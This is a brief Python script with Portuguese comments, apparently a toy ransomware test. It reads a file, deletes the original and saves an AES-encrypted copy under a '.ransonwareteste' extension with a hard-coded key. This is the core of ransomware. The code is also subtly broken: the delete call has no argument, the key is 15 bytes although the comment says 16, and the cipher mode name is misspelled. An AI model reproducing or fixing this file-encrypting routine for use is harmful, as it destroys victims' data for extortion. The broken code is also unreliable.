import os
import pyaes

## Abrir o arquivo criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

##Removendo o arquivo
os.remove()

##Chave de criptografia, com 16 caracteres
key = b"testeransonware"
aes = pyaes.AESModeOfOperationCTF(key)

##Criptografrando o arquivo
crypto_data = aes.encrypt(file_data)

##Salvando o arquivo criptografado
new_file = file_name + ".ransonwareteste"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()